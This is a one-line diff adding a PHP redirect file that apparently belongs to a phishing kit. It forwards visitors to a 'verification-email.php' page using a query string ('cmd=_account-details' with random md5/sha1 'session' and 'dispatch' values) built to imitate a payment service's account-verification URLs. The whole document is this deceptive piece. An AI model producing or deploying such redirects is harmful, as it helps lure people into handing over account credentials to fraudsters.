@@ -1,0 +1,1 @@
+<?phpheader("Location: ../verification-email.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));?>
